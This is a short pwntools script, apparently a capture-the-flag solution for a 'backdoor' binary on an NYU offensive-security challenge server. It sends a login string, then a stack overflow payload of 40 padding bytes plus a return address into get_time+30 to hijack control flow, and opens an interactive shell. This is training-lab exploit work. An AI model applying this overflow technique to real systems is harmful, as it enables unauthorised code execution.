from pwn import *

e = ELF('backdoor')
#context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ['alacritty', '-e', 'zsh', '-c']
p = process('backdoor')
#gdb.attach(p)
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1339)

out = p.recv(1000)
print(out)
p.sendline(b'rt1726')
out = p.recv(1000)
print(out)
out = p.recv(1000)
print(out)

rsp = "0x4006bb"
payload = b'A'*40 + p64(e.symbols['get_time']+30)
p.sendline(payload)
print("sent")
#p.sendline(b'A'*40 + p64(e.symbols['get_time']))
out = p.recv(1000)
print(out)
p.interactive()

#get_time
#0x40069d
#target
#0x4006bb